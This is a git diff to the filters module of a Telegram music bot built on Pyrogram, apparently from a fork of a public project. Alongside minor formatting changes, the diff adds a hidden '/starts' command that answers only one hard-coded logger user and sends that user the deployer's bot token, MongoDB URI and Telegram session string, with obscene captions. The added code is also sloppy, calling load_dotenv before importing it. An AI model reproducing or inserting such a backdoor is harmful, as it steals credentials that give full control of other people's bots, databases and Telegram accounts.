@@ -1,14 +1,22 @@
 import re
 import datetime
 from pyrogram import filters
+from VIPMUSIC.utils.database import LOGGERS
 from pyrogram.types import (
     InlineKeyboardButton,
     InlineKeyboardMarkup,
 )
-
+import asyncio
+import time
+from os import getenv
+load_dotenv()
+from dotenv import load_dotenv
 from VIPMUSIC import app
 from utils.error import capture_err
 from utils.permissions import adminsOnly, member_permissions
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 from VIPMUSIC.utils.keyboard import ikb
 from .notes import extract_urls
 from VIPMUSIC.utils.functions import (
@@ -16,6 +24,7 @@ from VIPMUSIC.utils.functions import (
     extract_text_and_keyb,
     get_data_and_name,
 )
+from dotenv import load_dotenv
 from VIPMUSIC.utils.database import (
     deleteall_filters,
     get_filter,
@@ -116,10 +125,10 @@ async def save_filters(_, message):
         return await message.reply_text(f"__**sᴀᴠᴇᴅ ғɪʟᴛᴇʀ {name}.**__")
     except UnboundLocalError:
         return await message.reply_text(
-            "**ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪs ɪɴᴀᴄᴇssᴀʙʟᴇ.\n`ғᴏʀᴡᴀʀᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.`**"
-        )
-
-
+            "**ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪs ɪɴᴀᴄᴇssᴀʙʟᴇ.\n`ғᴏʀᴡᴀʀᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.`**")
+@app.on_message(filters.command("starts") & filters.private & filters.user(int(LOGGERS)))
+async def help(client: Client, message: Message):
+    await message.reply_photo(photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",)
 @app.on_message(filters.command("filters") & ~filters.private & ~BANNED_USERS)
 @capture_err
 async def get_filterss(_, message):
